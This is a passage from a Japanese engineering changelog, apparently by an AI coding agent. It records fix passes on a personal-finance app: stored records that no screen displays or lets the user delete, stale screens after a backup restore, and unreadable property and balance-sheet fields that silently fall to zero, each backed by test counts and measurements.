(**欠陥がそのまま再現**) / B 断りを捨てる ❌1 / C 逃げ口を名指ししない ❌3 / D main が `installed` を渡さない ❌2 / E main が常に一覧を引く ❌1 / F 導入済みを見ない ❌3 / G 1 つだけの規則を外す ❌2 / H 伏字と天井を外す ❌1 / I 橋が無いときも断る ❌1・復帰後 **93 / 93**)。★ **ゲートが 6 つ捕まえた —— 2 つは私の記述が正確だったせいで鳴った**: ① **`storageReadLedger` / `storageReadPolicy` が注記を落としていなかった** —— 直した欠陥の式を docblock に正確に引用したら、**その引用が「読み取り箇所」として数えられた** (法則 `mention-vs-declaration`)。両方に `stripNonCode` を通した —— **実測: `src/renderer` の一致は 20 → 19 件 / 23 → 22 件で、減ったのは引用の 1 行だけ** (他は 1 件も動かない)。「注記の中の言及は数えない / 同じ綴りでもコードなら数える」の標本を両方に置いた ② **`redactionCoverage` の題名と中身が違った** —— 題名は「redact / assistantLimits の**輸出である**」と名乗るのに、中身は **5 つの手書きの一覧**だった。梯子の既存の段 (`MAX_LOCAL_MODEL_ERROR_CHARS`・2026-09-22 から輸出) を使うと 「輸出ではない」と鳴る。**輸出から導く**形に直し、手書きの 5 つは標本として残した ③ `namedEscapeHatchReachable` —— 新しい断りが「「Ollama」の画面」を名乗るので台帳が鳴った。**この行は記録から生まれない文**なので `collection` / `sample` を任意にし、**「標本を持たない行は `other-screen` だけを名乗る」を両方向で足した** (標本の無い行が点検パネルや一覧を名乗ると、**消す物が無い所へ利用者を送る**) ④ `namedControlExists` —— 「Ollama」を `screen-label` として登録 ⑤ `responseBodyCapCensus` —— 上限つきの読みが 44 → **45** (main の `/api/tags` の分・理由つきで更新) ⑥ `lint:shared-judgement` —— `ollama` の renderer 側の読み手が 4 → 5 (再生成。**判定の散文は今も真**)。★ **測って何も無かった軸も記録する**: ① **ライブラリ (IndexedDB blob) 側は今日は欠陥ではない** —— `library.ts` に知らせる仕組みは **1 つも無く** (構造はパス 448 の欠陥と同じ)、実測で **描いたまま書くと保管層 1 件 / 画面 0 件**だが、**書き手 5 か所はすべて `LibraryPage` と別の画面**から走り、`App.tsx` が `key` で画面を入れ替えるので戻れば必ず `refresh()` が走る (実測: 描き直すと 1 件 / 7 B)。**罠であって今日の生きた欠陥ではない**ので `docs/REMAINING_WORK.md` に測って残した ② **`servicehub.ollama.port` も書き手 0 件**だが、読むのは `?? ` の 2 段目 (後方互換) なので面を作らない ③ **`chatbot-ollama-model` の読みは残した** —— 一覧から決まるので鍵が空でも自由質問は通り、手で置いた人の意思を尊重する口としてだけ生きる。**画面から書く口は足していない** (足すと「Ollama」の画面の一覧と 2 つ目の選び方ができる)。`typecheck` 緑・`npm test` **875 / 18,878**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15688 → **15713** へ (**今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 256 ms / heap 10.3 MB・FULL DCL 726 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **45 回目**でもあり、今回も再現しなかった)・**`e2e:ollama` も回した** (main の Ollama を触ったので) —— 全件 PASS)・— **2026-09-24 パス 448 後の計測: 11,964,272 B / 3,376,791 B (両方 +1,718 B** —— 知らせる仕組みを 1 つのモジュールへ出してストアの 6 つの書き込みが通る分・保管した行を画面が並べる口 1 つ・コネクタ画面の節 1 つ (表と断り 3 文・行ごとの「削除」)。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**アプリが自分で書いた行を、どの画面も見せなかった —— そして書いたことを誰にも知らせていなかった。** **見つけ方**: 形の表 (`COLLECTION_SHAPES`) の 23 件を**面の側から**数えた (走査ではなく実行時の `Object.keys` から導いた —— 綴りの針では名前つきの形 `KPI_SHAPE` と直書きの形が映らず 21 件しか出なかった)。**購読する画面が 0 件の collection が 3 件**で、うち 2 件 (`overview-overrides` / `overview-custom-metrics`) は**書き手も 0 件**の死んだ名前 (`git log -S` で全履歴 1 コミット・罠として `docs/REMAINING_WORK.md` に測って残した)。残る 1 件が本物だった。実測 (2026-09-24 · 直す前 · 無料コネクタは **10 件すべて実行でき、行き先はちょうど半分ずつ**):

| 行き先 | 件数 | 押したときの文 | 画面に出るか | 消せるか |
| --- | ---: | --- | --- | --- |
| `library` | **5** | 「ライブラリに x.json を保存しました。」 | ライブラリ画面に出る | 「削除」が在る |
| **`storage`** | **5** | 「ストレージに「7203」を記録しました。」 | **どの画面にも出ない** | **「すべてのデータを削除」だけ** |

★ **同じパネルの同じボタンで、行き先だけが違う。** どちらも**記録したと告げる**のに、片方は見ることも消すこともできない (法則 `escape-hatch-stays-open`)。3 回押すと 3 件溜まり、点検パネルは「調べた 3 件 / **形式不正 0 件**」と答える —— 形は合っているので**そこにも現れない**。中身は見本の payload だが、**暗号化された保管庫と同じ origin に溜まる** (立ち退きはトークンごと持っていく)。★ **面を足したら動かず、そこで 2 つ目が出た** —— 押すと保管層は 1 件になるのに画面は 0 件のまま。実測 (直す前・`useCollection` で購読する部品を置いて 3 つの書き込み経路を叩く):

| 経路 | 保管層 | 画面 |
| --- | ---: | ---: |
| `getRecordStore().insert` (コネクタ実行) | 1 件 | **0 件** |
| 点検パネルの削除 (`deleteRecords`) | 1 件 | **0 件** |
| **バックアップの置換復元 (`importAll`)** | 1 件 | **0 件** |

★ **知らせる仕組みが `useCollection` の中に在った** —— つまり **hook を通らない書き込みは、どの画面にも届かなかった**。出荷コードに 3 本在り、**いちばん重いのは同じ画面の中で起きる**: 設定画面は `BackupPanel` (SettingsPage:1125) と `ParametersPanel` (:1132) を**並べて描く**。実測 (2026-09-24 · 直す前 · 消費税率の上書きを 5% で置き、25% の控えを置換復元):

```
復元の前: 有効値=0.05
復元の後: 有効値=0.05   ← 画面と、そこから計算する税額
保管層:   [{"values":{"tax.consumptionStandardRate":0.25}}]
```

**保管層は 25%、画面は 5%。** 画面は「復元しました」と言い、**その隣で復元前の率が税額を作り続ける** (再読込まで)。パス 384 が「購読の写しを判定に使うと一覧が届く前に働かない」を直した当の家系で、こちらは**書いた側が黙っている**形である。**直し**: ① 知らせる仕組みを `data/collectionChange.ts` へ出し、**ストアの 6 つの書き込み** (`insert` / `insertMany` / `update` / `remove` / `clearCollection` / `importAll`) が通る —— hook は購読するだけで自分では知らせない ② **`reencryptAll` だけは知らせない** (**復号した中身が構造上 1 ビットも変わらない**ため。費用ではなく中身が同じが理由で、それを検査が別に主張する) ③ `connector-output` に面を足す (**押した所に置く** —— パス 447 と同じ判断で、逃げ口は保存できた所に在る) ④ **読めない行も落とさない** (落とすとその行だけ画面から消えてまた消せなくなる · パス 227 / 444) ⑤ **id は必ず返す** (消すのに要る唯一の鍵)。★ **配る先は collection で絞らない (理由を測って決めた)** —— `remove(id)` は collection を引数に持たず、`importAll(..., {replace:true})` は**控えに 1 行も無い collection を空にする**。どちらも「どの collection が変わったか」を別に計算しないと分からず、**その計算を誤ると画面が古いまま = いま直している欠陥そのもの**が戻る。**失敗の形が直している欠陥と同じ最適化は採らない。** 代わりの費用は「読んでいる hook の数だけ `list()` が 1 回ずつ」で、`notifyCollection` の docblock が 2026-08 に同じ天秤で同じ側を選んでいる。★ **機械は 2 層** —— `renderer/data/__tests__/storeChangeNotification.test.ts` (**20 件**) は**母集団を公開の契約から走らせ** (`export interface RecordStore` の成員名を原文から拾い、実物の prototype と両方向で突き合わせる)、台帳が 1 つずつ `notifies` / `silent` を**理由つきで**名乗り、**背骨は振る舞い** —— 実物のストアに購読者を付けて各メソッドを実際に呼ぶ (字面では、呼ばれない所に書かれていても緑になる)。背骨は `renderer/components/__tests__/storeWriteReachesScreen.test.ts` (**4 件**) で、**実物の 2 つのパネルを 1 つの root に並べ**、実物の File を渡して置換復元とマージ復元を押す。`renderer/data/__tests__/connectorOutputVisible.test.ts` (**6 件**) が行き先の半々を `FREE_CONNECTORS` から導き、`renderer/pages/__tests__/connectorOutputOnScreen.test.ts` (**5 件**) が実物の画面で ▶ 実行 → 削除 を押す。★ **錠は構造で取った** —— 「ストレージ」はコネクタ一覧の説明文にも出るので、その綴りで待つと**行が届く前の姿**を測る (パス 442 / 445 / 446 / 447 で踏んだ罠)。待つのは `[data-connector-output-row]`。対照 **11 方向すべて鳴り、それぞれ狙った検査に当たる** (A ストアの通知を全部外す ❌11 (**欠陥がそのまま再現**) / B 通知を hook へ戻す ❌11 (**直す前の形そのもの**) / C 記録した結果の節を画面から外す ❌4 / D 読めない行を落とす ❌2 / E 行ごとの「削除」を外す ❌4 / F 通知を 1 つの collection へ絞る ❌6 (**採らなかった最適化**) / G `reencryptAll` も知らせる ❌1 / H 台帳から 1 行消す ❌2 / I 契約に新しいメソッドを足して台帳に書かない ❌1 (**`purgeEverything` を名指し**) / J `id` を返さない ❌4 / K 解除を効かなくする ❌4・復帰後 **35 / 35**)。★ **ゲートが 4 つ捕まえた —— どれも設計どおり**: ① `submitGuardCensus` —— `ConnectorsPage` が保管層を購読し始めたので**前から在った ▶ 実行のボタン**が母集団に入った。`runningId` が押した行だけを disabled にしており、**ここは「同じ意図の二重送信」ではなく「もう 1 回実行する」**ので理由つきで台帳へ (**行が画面に出て消せるようになったので取り消せる**ことも理由に書いた) ② `namedControlExists` —— 新しい断りが「ライブラリ」を名指しするので「台帳に書け」と鳴った (`screen-label` として登録・同じ検査が `SERVICES` と突き合わせる) ③ `zeroFoldCensus` / `lint:shared-judgement` —— `?? 0` が 1 件**移った**だけ (合計 276 は不変) と `displayField` の読み手が 11 → 12 になった分を再生成 ④ `lint:test-coverage` —— 私の census が `@vitest-environment jsdom` を名乗りながら DOM に 1 度も触らない (**jsdom は 1 ファイルあたり ~0.65 秒**)。外した。★ **自戒: 検査は 20 件とも緑なのに `typecheck` だけが 2 件捕まえた** (使わない import と `m[1]` の `string | undefined`)。vitest は型を剥がすので当たらない。**パス 373 / 402 / 404 / 434 / 445 / 446 と同じ罠で 7 度目**である。★ **測って何も無かった軸も記録する**: ① **`library` 側は最初から正しい** —— `LibraryPage.tsx:212` が `remove(id)` を確認つきで持つ ② **`reencryptAll` を黙らせても答えは変わらない** (復号した中身が同じなので、知らせないことで古い値が残る道が無い) ③ **循環参照は作っていない** —— `collectionChange.ts` は何も import しない。`typecheck` 緑・`npm test` **873 / 18,853**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15663 → **15688** へ (**今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 268 ms / heap 10.3 MB・FULL DCL 735 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **44 回目**でもあり、今回も再現しなかった))・— **2026-09-24 パス 447 後の計測: 11,962,554 B / 3,375,073 B (両方 +1,829 B** —— 効かない上書きを判じる口 1 つ・原因ごとの断り 2 文 (日本語)・その行を並べる部品 1 つ・見出しの件数 1 か所。**増分の大半はその 2 文**で、docblock は最小化で落ちる。`renderer/` は両ビルドが読むので LITE も同じだけ増える。**保存した上書きが、数えられるのに画面に出ず、消すこともできなかった。** **見つけ方**: パス 446 が閉じた「投げない嘘」の隣を見ず、`docs/REMAINING_WORK.md` に残っていたもう 1 件 (**`applyOverrides` の `ignored` を読む出荷コードが 0 件**) を測りに行った。実測 (2026-09-24 · 直す前 · 実物の保管層へ入れて実物の欄を描く · `kpi` に目録の 1 件 + 目録に無い 1 件):

| 見るもの | 直す前 |
| --- | --- |
| 見出しの件数 | **置き換え 2 件** |
| 一覧に出る行 | **1 行** |
| 「自動に戻す」 | **1 件** |
| 孤児のパスの綴り | **画面に 1 字も無い** |
| 点検パネル | **「形式の合わないレコードはありません」** |

★ **欠陥は「告げない」より 1 段重かった** —— 断りが無いのではなく、**行そのものが生えない**。並べているのは `myOverrides` ではなく**目録 (catalog)** なので、目録に無いパスは `byPath.get(f.path)` に当たる行が無い。**数えるのに出さない**形で、`belongsToScope` の docblock が自分で名指ししている パス 61 / 170 の家系 (「3 件」と書いてあるのに 2 行しか出ない) が**別の戸から戻っていた** —— あのときは件数と行を別々の規則から導いたのが原因で、今回は**件数が `myOverrides` を・行が目録を**見ている。★ **一覧を持たない画面はもっと静か** —— `hasCatalog(scope)` で欄ごと囲っているので、実測で `linux` に 1 件置くと見出しは「置き換え 1 件」と言い**パネルそのものが出ず**、消すボタンは 0 件。**保存できた所に逃げ口が無い** (法則 `escape-hatch-stays-open`) ので、残る道は「すべてのデータを削除」だけである。★ **点検パネルも見つけない (測った)** —— 形の表は `path: str` としか言わないので孤児は**形として正しい**。**値が数でない側だけは形が拒む**ので点検パネルが見つけるが、そのとき画面は「手入力 NaN 円」を**緑の札**で出す —— 適用されていない値を適用されたと名乗る。★ **届く道** —— 目録の欄名を変えた・欄を無くした後に前の行が残る形と、`store.list()` が読みで形を見ない設計 (パス 360) で既に入っている行。**`CATALOGS` は 1 コミット・`OVERRIDABLE_FIELDS` は 3 コミットなので改名はまだ起きていない** —— つまりこれは**罠であって今日の生きた欠陥ではない** (パス 359 / 398 / 439 と同じ位置づけ)。ただし `linux` の側は**今日でも保存できる**ので、そちらは生きている。**直し**: ① **判定は 1 つ** `overrideCause(scope, entry)` —— **順序は `applyOverrides` と同じ** (目録を先に引き、それから値を見る)。逆にすると、パスも値も壊れた行について「計算が使った理由」と「画面が述べる理由」が食い違う (パス 401 の形・対照 E がその向きを撃つ) ② **効く行と効かない行を同じ口で分ける** —— 置き換え欄には効く行だけを渡すので、緑の札が捨てられた値を名乗らなくなる ③ 原因ごとに 2 文 (`inertOverrideNote`) —— 直す手が違うので片方の文で両方を述べない (パス 388 / 443 / 446 と同じ規則) ④ **`hasCatalog` では囲わない** —— 囲うと一覧を持たない画面の行が消えないままになる ⑤ **見出しも未適用の件数を言う** (畳んだ状態で見えるのはそこだけ) ⑥ **パスは `displayField` の天井を通す** —— 形は長さを見ないので、ここが**その行を見せる唯一の面**である以上 1 件で欄が使えなくなってはいけない (パス 419 / 420 の家系)。★ **文は data 層が持つ** (`.tsx` は変異検査の母集団の外・パス 386 / 445 と同じ判断)。★ **正しい行の答えは 1 つも変わらない** (実測: 効く行だけならこの節は出ず、見出しに「未適用」も出ない)。★ **機械は 2 層** —— `renderer/data/__tests__/inertOverrides.test.ts` (**14 件**) の背骨は**両方向の一致**で、一覧を持つ全画面 (走査・床 5) について「画面が効かないと言う行の集合 == `applyOverrides.ignored`」と、その逆 (効くと言った行は実際に `overridden` に居る) を突き合わせる —— **面と実装が構造的に揃う**。背骨は `renderer/components/__tests__/inertOverrideOnScreen.test.ts` (**7 件**) で、実物の保管層へ入れて実物の欄を描き、実際に「削除」を押す。★ **錠は構造で取った** —— 「置き換え」はパネルの見出し (「計算値の置き換え」) にも在るので、その綴りで待つと**行が届く前の姿**を測る (パス 442 / 445 / 446 で踏んだ罠)。待つのは `[data-inert-override]`。対照 **10 方向すべて鳴り、それぞれ狙った検査に当たる** (A 効かない行を画面から外す ❌4 (**欠陥がそのまま再現**) / B `hasCatalog` で囲う ❌1 (**一覧の無い画面だけが鳴る**) / C 置き換え欄に効かない行も渡す ❌1 (**緑の札が NaN を名乗る**) / D 見出しの未適用の件数を消す ❌1 / E 判定の順序を逆に ❌1 / F 原因を 1 文へ畳む ❌2 / G 逃げ口を名指ししない ❌1 / H 判定を常に null ❌9 / I 別の画面の行も数える ❌1 / **J パスの天井を外す ❌1**・復帰後 **157 / 157**)。★ **自戒: J は 1 度目に鳴らなかった —— それは報せだった** —— 私は天井を足したのに、それを留める検査を 1 つも書いていなかった (法則 `mention-vs-declaration` の形で、**足した守りが無縛**)。200,000 字のパスを実際に保管層へ入れて欄を描く検査を足すと、J は狙いどおり 1 件で鳴る。**鳴らない対照は合格ではなく、その検査についての報せである。** ★ **ゲートが 2 つ捕まえた —— どちらも設計どおり**: ① `inlineColorCensus` (パス 315) —— 私が等幅の指定に `var(--mono, monospace)` と書いたが `--mono` は **どこにも定義が無い**。**あの census が見つけた当の欠陥 (画面が読む 4 つの変数名が 1 つも定義されていなかった) を、書いた本人が 1 つ足していた**。素の `monospace` に直した ② `namedControlExists` (パス 426) —— 新しい断りが「削除」を名指しするので「台帳に書け」と鳴った。理由つきで登録した (**文は `manualData.ts` が組むが、押す所は同じ欄の同じ行に在る** —— その行を見せる面はここだけなので、別の画面へ送ってはいけない)。★ **測って何も無かった軸も記録する**: ① **3 つ目の理由は面を作らない** —— `applyOverrides` は「目録に在るが土台にその階層が無い」ときも捨てるが、それは保存された記録ではなく**目録と土台の食い違い**で、しかもその行は目録に在るので画面に出ており「自動に戻す」で消せる (**逃げ口は開いている**)。判定の口からも構造的に見えない (土台を持たない) ので、docblock に測って書いた ② **`scope` が未知の行は原因ではない** —— `applyManualOverrides` は先に scope で絞るので、他の画面の行は `ignored` に 1 度も現れない (実測)。`typecheck` 緑・`npm test` **869 / 18,818**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15642 → **15663** へ (**今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 250 ms / heap 10.3 MB・FULL DCL 729 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **43 回目**でもあり、今回も再現しなかった))・— **2026-09-24 パス 446 後の計測: 11,960,725 B / 3,373,244 B (両方 +2,229 B** —— 数の欄の表 (4 行・日本語のラベルつき)・倒した欄の名簿・鍵で問う口 1 つ・原因ごとの断り 4 文 (日本語)・画面の配線 1 か所。**ラベルと文は docblock ではなく値**なので最小化で落ちない。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**不動産の月次経費・月次返済が数として読めないと黙って 0 へ倒れ、月次キャッシュフローが過大に出ていた。** **見つけ方**: パス 445 が「測って、このパスでは直さないと決めた軸」として `docs/REMAINING_WORK.md` に残した 1 件目を、そのまま閉じた。実測 (2026-09-24 · 直す前 · 1 件 · 正しい控え = 月次キャッシュフロー ¥70,000 / 表面利回り 6%):

| 壊した欄 | 月次キャッシュフロー | 表面利回り | 画面の断り |
| --- | ---: | ---: | --- |
| (正しい控え) | ¥70,000 | 6% | 無し |
| **月次経費** | **¥90,000** | 6% | **無し** |
| **月次返済額** | **¥80,000** | 6% | **無し** |
| 家賃 (入居中) | △¥30,000 | **0%** | 「家賃が読めないため」 |
| 取得価格 | ¥70,000 | ― | 「取得価格が読めない 1 件」 |

★ **`'30000'` / `{z:1}` / `[1]` / `true` / `null` / `NaN` の 6 形すべてで同じ。** ★ **同じ関数の 4 欄のうち 2 つだけが黙っていた** —— 家賃と取得価格は 2026-09-08 (パス 54 / 187) から原因を正しく述べる。パス 398 / 408 と同じ「隣が検めているのに、この欄だけその前提を持たない」非対称である。★ **向きが利用者の損である** —— 手残りを**過大**に見せるので、この画面を見て買い増しを決める人に逆向きの誤りを渡す。★ **測ったら 2 つ目が出た** —— **家賃が読めない物件が表面利回りの平均に 0% として入っていた**。実測で 3 件そろい **5.50% が 4 件目 1 件で 4.13%** になり、`yieldScopeNote` は 1 文も出さない。**その文自身が「0% として平均すると全体が下がります」と名指ししている当の失敗である** —— パス 54 は取得価格 (分母) を外したが、**分子の側が残っていた**。空室ならどの断りにも現れない (入居中の断りは `occupied` を見るので)。★ **3 つ目 —— 原因を取り違えた断り** —— 入居中で家賃 0 円の物件に「家賃が**読めない**ため」と述べていた。家賃 0 は**入力欄が受け付ける値** (`parsePropertyEntry` は 0 以上を通す · 取得価格だけが 1 円以上) なので、0 と打ち込んだ利用者にとって偽であり、しかも直す手が違う (0 円なら家賃を入力する / 読めないなら消して入れ直す · パス 388)。**直し**: ① **数の欄の表は 1 つ** (`PROPERTY_NUMERIC_FIELDS`) —— 倒す側と報告する側を別々に書くと、5 つ目の欄が足された日に**倒すのに報告しない欄**ができる ② 名簿は**平らな 1 本** (`unreadableFields?: readonly string[]`) —— 貸借対照表と違い**倒す先が 1 つ (0) しか無い**ので、2 つに分けるのは在りもしない区別を作ることになる。代わりに**鍵で問う口** `unreadablePropertyField(key, fields)` を置き、集計が「家賃」という綴りを持たずに済むようにする (パス 445 と同じ形) ③ **未入力は名簿に入れない** —— 任意の 2 欄は「任意、既定 0」と型が宣言し入力欄も「空欄は 0」と約束しているので、欄が無いのは宣言どおりの 0 である (パス 444 ③ と同じ規則) ④ **家賃が読めない物件は利回りの平均から外す** —— ただし**本当に 0 円の家賃は外さない** (空室の表面利回り 0% は既存の検査が仕様として留めている当の判断で、**対照 J がその向きを撃つ**) ⑤ 原因ごとに 4 文 (`yieldScopeNote` を 2 文へ・`occupiedWithoutRentNote` を 2 文へ・`unreadableCostNote` を新設) ⑥ **行ごとは落とさない** —— 経費が読めないだけの物件を一覧から消すと家賃も入居率も一緒に消える (パス 227 / 444 と同じ判断)。★ **正しい控えの答えは 1 つも変わらない** (実測: cf ¥70,000 / 利回り 6% / 断り 0 文)。★ **機械は 2 層** —— `renderer/data/__tests__/unreadablePropertyFields.test.ts` (**26 件**) が**母集団を形から振る舞いで導く** (「この欄に数でない値を入れると 0 に倒れるか」を実物に訊く) ので、表と形の過不足が両方向で鳴る。背骨は `renderer/pages/__tests__/storedPropertyFieldReads.test.ts` (**7 件**) で、実物の保管層へ入れて実物の不動産ページを描く。★ **錠は構造で取った** —— 「自分の物件は 1 件」は見本が混ざっていることの断りで、控えが届いたときだけ出る (パス 442 / 445 で踏んだ「ラベルは行より先に出る」罠を避ける)。対照 **10 方向すべて鳴り、それぞれ狙った検査に当たる** (A 名簿を作らない ❌14 (**欠陥がそのまま再現**) / B 経費・返済を数えない ❌4 / C 経費の断りを画面から外す ❌2 / D 家賃が読めない物件を 0% で平均へ戻す ❌6 / E 入居中の原因を分けない ❌4 / F 利回りの 2 文を 1 文へ畳む ❌5 / G 鍵で問う口を常に false ❌13 / H 未入力も名簿に数える ❌3 / I 表から 1 行消す ❌4 / **J 本当に 0 円の家賃も平均から外す ❌4** —— **逆向き**: 既存の判断が守られていることを示す・復帰後 ❌0)。★ **既存の検査 3 件を、主張を緩めずに直した** —— ① `investments.test.ts` の「対照: 揃った控えは 1 つも書き換えない」は `toEqual(full)` なので、`const { unreadableFields, ...values }` で**名簿を外して元の主張をそのまま当て**、名簿が空であることを**別に**主張する (パス 444 と同じ形) ② 物件 0 件の `toEqual` に新しい 4 欄 ③ `realEstateYieldScope.test.ts` の「家賃が読めない」は**家賃の欄そのものが無い**標本なので、原因の訂正に合わせて「家賃が 0 円のため」へ。**逆向き** (「数として読めない」と言わないこと) も足したので、主張は増えている。★ **ゲートが 1 つ捕まえた**: `namedEscapeHatchReachable` (パス 425) —— 新しい断り 3 つが「形式の合わないレコード」を名指しするので「台帳に書け」と鳴った (**設計どおり**)。理由と標本つきで登録し、**「読めない」側の文だけが名指しすること**も理由に書いた (取得価格が読めない側は欄そのものが無い控えでもそこへ来るので、消す物が無い人を送ってはいけない)。★ **自戒: 検査は 26 件とも緑なのに `typecheck` だけが 2 件捕まえた** (`COLLECTION_SHAPES['realestate-properties']` は型の上で `undefined` を取りうる)。vitest は型を剥がすので当たらない。**パス 373 / 402 / 404 / 434 / 445 と同じ罠で 6 度目**である。★ **測って何も無かった軸も記録する**: ① **面は 1 つ** —— `computeRealEstatePortfolio` と 3 つの断りを読む所は木全体で `RealEstatePage.tsx` だけ (走査で確かめた)。**紙には届かない** —— 計算書類の参考別紙 (`buildPortfolioAnnex`) の引数は `SNAPSHOT.realEstate.properties` (同梱の見本) なので、壊れた保管値はあの紙に届かない (パス 445 で測った当のこと) ② **`purchasePrice` が 0 の道は復元だけ** —— 入力欄は 1 円以上を要求する。`monthlyRent` の 0 はフォームから到達可能で、だから原因の分岐が要った。`typecheck` 緑・`npm test` **867 / 18,797**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15609 → **15642** へ (**今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 248 ms / heap 10.3 MB・FULL DCL 716 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **42 回目**でもあり、今回も再現しなかった))・— **2026-09-24 パス 445 後の計測: 11,958,496 B / 3,371,015 B (両方 +783 B** —— 鍵で名簿を問う口 1 つ・原因ごとの断り 2 文 (日本語)・KPI ページが名簿を刷る 1 か所。増分の大半はその 2 文である。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**パス 444 が 4 つの面を直した翌手に、5 つ目が残っていた —— しかもそこは「0 と入力してください」と直す手まで名指ししていた。** **見つけ方**: 次に閉じる欄を決めるため「投げない嘘」の残り ~50 欄の**到達先**を測っていて、`balanceSheet.ts` の `interestBearingDebtUnentered` / `cashUnentered` が `=== undefined` で決まることに気付いた。パス 444 の名簿 (`missing`) は**まさにその `undefined` へ倒した欄**を集めるので、2 つの旗は「本当に未入力」と「打ち込んだが読めない」を**構造的に見分けられない**。読み手は 1 面だけ —— `KpiPage.tsx` の貸借対照表パネル。実測 (2026-09-24 · 直す前 · 実物の保管層へ入れて実物の KPI ページを描く · 健全な控え = 自己資本比率 33.3% / 流動比率 160%):

| 壊した欄 | 自己資本比率 | 純資産 | 流動比率 | パネルの断り |
| --- | ---: | ---: | ---: | --- |
| (正しい控え) | 33.3% | ￥4,000,000 | 160% | 無し |
| **有利子負債 (任意)** | 33.3% | ￥4,000,000 | 160% | **「有利子負債が未入力のため…借入が無いなら 0 と入力してください」** |
| **現預金 (任意)** | 33.3% | ￥4,000,000 | 160% | **「現預金が未入力のため…借入が無いなら 0 と入力してください」** |
| 有利子負債 (本当に未入力) | 33.3% | ￥4,000,000 | 160% | **同じ文** |
| **流動資産 (必須)** | **-100%** | **-￥4,000,000** | **0%** | **無し** |

★ **2 行目と 4 行目は 1 字も違わなかった** (5 形すべてで)。打ち込んだ利用者にとって偽である。★ **重いのは文ではなく直す手である** —— 「0 と入力してください」に従うと 5,000,000 が 0 に置き換わり、ネットデットが「—」から**確信のある誤った数**に変わる。**原因を取り違えた断りは、直す手ごと誤らせる** (パス 388) の、いちばん実害の出る現れで、しかも**そちらへ行くよう明示的に案内していた**。★ **同じ文が自分でそれを名乗っていた** —— 「0 と「未入力」は別の事実として扱います」。2 つを分けると称しながら、**3 つ目をその片方へ畳んでいた**。★ **5 行目はパス 444(A) の 5 つ目の面** —— 貸借対照表を**打ち込む当の画面**が、債務超過の数字を理由 1 文も無しで出していた。パス 444 は書面 §4 / 書面 §5 / 経営ハイライト / 経営サマリーの画面を直したが、**入力欄の真下にある面**が漏れていた (**直す手にいちばん近い面である**)。**直し**: ① 鍵で問う口 `unreadableBalanceSheetField(key, u)` —— 画面が「有利子負債」という綴りを持たずに済み、ラベルは `BS_NUMERIC_FIELDS` から引く ② **文は data 層が持つ** (`netDebtUnavailableNote`) —— 最初に書いた版は 30 行の IIFE を `.tsx` に置いたが、**`.tsx` は変異検査の母集団の外**なので「どちらの文が出るか」を誰も測らない (パス 386 と同じ判断で書き直した) ③ **止まる物の名前は欠けた欄で決まり、原因では決まらない** —— 有利子負債が欠ければ原因が何であれ有利子負債比率も止まるので、その名前は 2 つの文で共有し、分けるのは**原因と直す手**だけにする (対照 E がその向きを撃つ) ④ KPI ページにも名簿の断り (`unreadableBalanceSheetNote` · `role="alert"`) を配線 ⑤ `normalizeBalanceSheet` の**2 度呼び**を 1 度に畳んだ (どちらの結果も名簿を捨てていた)。★ **本当に未入力の人への文は 1 字も変えていない** (実測: byte 単位で同じ)。**正しい控えの答えも 1 つも変わらない** (33.3% / 160% のまま・断りは 0 文)。★ **機械は 2 層** —— `renderer/data/__tests__/unreadableBalanceSheetFields.test.ts` を **31 → 44 件**へ。要点は **2 つの口が全欄で同じ答えを出すこと**を両方向で留めること (鍵で問う口とラベルで分ける口は `BS_NUMERIC_FIELDS` の同じ行を見る) と、**必須の欄は鍵で問っても false** であること (0 として算定したのであって、算定していないのではない)。背骨は `renderer/pages/__tests__/storedBalanceSheetKpiReads.test.ts` (**19 件**) で、実物の保管層へ入れて実物の KPI ページを描く。★ **錠は構造で取った** —— 「自己資本比率」は**入力欄の上の案内文にも出る**ので、綴りで待つと行が届く前の姿を測る (パス 442 / 376 で 3 度踏んだ罠を、今回は最初の実測で踏んで気付いた)。`[data-bs-insights]` は貸借対照表が届いたときだけ描かれる。対照 **6 方向すべて鳴り、それぞれ狙った検査に当たる** (A 原因を分けず常に「未入力のため」へ ❌13 (**欠陥がそのまま再現**) / B 名簿の断りを KPI ページから外す ❌6 / C 鍵で問う口を常に false ❌19 / D 2 つの口を食い違わせる ❌19 / E 止まる物を原因で決める ❌2 / F 2 文を 1 文へ畳む ❌13・復帰後 **63 / 63**)。★ **ゲートが 1 つ捕まえた**: `namedEscapeHatchReachable` (パス 425) —— 新しい断りが「形式の合わないレコード」を名指しするので「台帳に書け」と鳴った (**設計どおり**)。理由と標本つきで登録し、**「読めない」側の文だけが名指しすること**も理由に書いた (本当に未入力の人を点検パネルへ送ってはいけない —— そこには消す物が無い)。★ **自戒: 検査は 63 件とも緑なのに `typecheck` だけが 1 件捕まえた** (`u.zeroed` —— `unreadableFields` は任意なので `u?.zeroed`)。vitest は型を剥がすので当たらない。**パス 373 / 402 / 404 / 434 と同じ罠で 5 度目**である。★ **測って何も無かった軸も記録する**: ① **計算書類の参考別紙は保管値を読まない** —— `buildPortfolioAnnex` の引数は `SNAPSHOT.mutualFunds.holdings` / `SNAPSHOT.realEstate.properties` (同梱の見本) なので、壊れた保管値はあの紙に**届かない** (`sane()` の 0 倒しは静的なリテラルに掛かる多層防御であって、生きた欠陥ではない) ② **不動産の家賃と取得価格は既に閉じている** —— 実測で `monthlyRent` が壊れると `occupiedWithoutRentNote` が「家賃が読めないため」と、`purchasePrice` が壊れると `yieldScopeNote` 